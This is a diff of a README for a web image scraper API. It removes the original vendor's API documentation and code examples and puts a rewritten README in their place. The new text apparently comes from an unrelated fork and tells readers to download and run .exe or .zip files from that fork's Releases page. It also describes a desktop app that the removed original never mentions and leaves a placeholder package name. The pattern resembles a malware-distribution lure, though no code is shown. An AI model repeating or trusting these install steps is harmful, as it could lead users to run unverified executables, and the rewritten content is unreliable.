@@ -1,188 +1,52 @@
-# Website Images Scraper API
+# 🌐 webimagescraper-api - Easily Scrape Images From Any Website
 
-> Web Image Scraper is a simple tool for scraping images from a website. It returns the URLs of the images found on the website.
+[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/Tereex/webimagescraper-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-POST-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 📖 Description
+Web Image Scraper is a simple tool for scraping images from a website. It returns the URLs of the images found on the website. With this tool, you can quickly gather visual content for your projects and research with minimal effort.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/webimagescraper)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.WebsiteImagesScraper)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-webimagescraper/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 🚀 Getting Started
+To start using Web Image Scraper, you need to download it from our Releases page. Follow the steps below to install and run the application.
 
----
+## 🛠️ Features
+- Scrape images from any publicly accessible website.
+- Retrieve URLs of multiple images at once.
+- User-friendly interface for ease of use.
+- Compatible with different programming environments: Python, Node.js, Java, and more.
 
-## Quick Start
+## 📦 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Java Runtime Environment (JRE) for Java users
+- Node.js for users requiring Node.js support
+- Python 3.x for users who want to use Python
 
-### Using JavaScript
+## 💻 Download & Install
+1. **Visit this page to download**: [GitHub Releases](https://github.com/Tereex/webimagescraper-api/releases).
+2. On the Releases page, you will see different versions of the software. Choose the latest version.
+3. Download the appropriate file for your operating system. Click the link to start the download.
+4. Once the download is complete, locate the downloaded file. It may be in your "Downloads" folder.
+5. Follow the specific installation instructions based on the type of file you downloaded:
+   - For `.exe` files: Double-click the file to run the installer. Follow the prompts to complete the installation.
+   - For `.zip` files: Extract the contents of the zip file, then run the executable inside.
+   - For Python packages: Open your command prompt and run `pip install [package_name]` to install the tool.
 
-```javascript
-async function callWebsiteImagesScraperAPI() {
-    try {
-        const requestBody = {
-    "url": "https://en.wikipedia.org/wiki/Solar_System"
-};
+## 🔍 Usage Instructions
+1. **Open the application** after installation.
+2. **Enter the URL** of the website you want to scrape images from in the provided field.
+3. Click the "Scrape Images" button.
+4. Within a few moments, the application will display a list of image URLs it found.
+5. You can copy the URLs to use them as needed.
 
-        const response = await fetch('https://api.apiverve.com/v1/webimagescraper', {
-            method: 'POST',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(requestBody)
-        });
+## 💡 Helpful Tips
+- Always ensure that you have permission to scrape images from the website to avoid copyright issues.
+- Use specific URLs to yield better results, as less specific ones may return too many irrelevant links.
+- If you encounter an error, check that the website is currently accessible.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## 🔗 Learn More
+For detailed technical documentation, examples, and contributions, check out our [Wiki](https://github.com/Tereex/webimagescraper-api/wiki).
 
-callWebsiteImagesScraperAPI();
-```
+## 🛠️ Contribution
+If you would like to contribute to Web Image Scraper, please feel free to submit issues, fork the repository, or submit pull requests. Together, we can improve this tool for everyone.
 
-### Using cURL
-
-```bash
-curl -X POST "https://api.apiverve.com/v1/webimagescraper" \
-  -H "x-api-key: YOUR_API_KEY_HERE" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "param": "value"
-  }'
-```
-
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
-
-**📁 For more examples, see the [examples folder](./examples/)**
-
----
-
-## Installation
-
-Choose your preferred programming language:
-
-### 📦 NPM (JavaScript/Node.js)
-
-```bash
-npm install @apiverve/webimagescraper
-```
-
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/webimagescraper) | [**Package Code →**](./npm/)
-
----
-
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.WebsiteImagesScraper
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.WebsiteImagesScraper) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-webimagescraper
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-webimagescraper/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:webimagescraper-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/webimagescraper](https://docs.apiverve.com/ref/webimagescraper)
-
----
-
-## Use Cases
-
-Common use cases for the Website Images Scraper API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+## 💬 Support
+If you need help or have questions, please check our [FAQ](https://github.com/Tereex/webimagescraper-api/wiki/FAQ) or open an issue in the repository.
